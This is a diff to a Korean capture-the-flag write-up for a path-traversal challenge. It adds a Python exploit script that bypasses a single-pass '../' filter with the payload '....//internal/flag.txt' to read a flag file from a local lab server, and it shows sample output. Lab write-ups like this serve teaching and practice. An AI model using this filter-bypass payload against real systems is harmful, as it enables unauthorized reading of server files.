@@ -162,10 +162,33 @@ def download():
 GET /download?file=....//internal/flag.txt
 ```
 
-브라우저 주소창에 넣거나 `curl` 로 바로 확인할 수 있다.
+브라우저 주소창에 넣어도 되고, 스크립트로는 아래처럼 보낸다.
+
+```python
+#!/usr/bin/env python3
+# easy-05 (안내 자료 보관함 / Path Traversal) - "....//" 로 필터를 우회해 internal/flag.txt 읽기
+# 사용: python3 exploit.py http://<IP>:8008
+import re
+import sys
+import requests
+
+BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:8008"
+
+# 1) 필터가 "../" 를 한 번만 지우므로 "....//" 는 지워진 뒤 "../" 로 남는다
+r = requests.get(f"{BASE}/download", params={"file": "....//internal/flag.txt"})
+print(f"[*] /download?file=....//internal/flag.txt -> {r.status_code}")
+
+# 2) 응답 본문이 flag.txt 내용 그대로다
+m = re.search(r"GlassHouse\{[^}]*\}", r.text)
+print(f"[+] FLAG: {m.group(0)}" if m else "[-] 실패")
+```
+
+실행 예시
 
 ```bash
-curl "http://127.0.0.1:8008/download?file=....//internal/flag.txt"
+$ python3 exploit.py http://127.0.0.1:8008
+[*] /download?file=....//internal/flag.txt -> 200
+[+] FLAG: GlassHouse{...}
 ```
 
 성공하면 응답 본문에 `GlassHouse{...}` 플래그가 그대로 실려 온다.
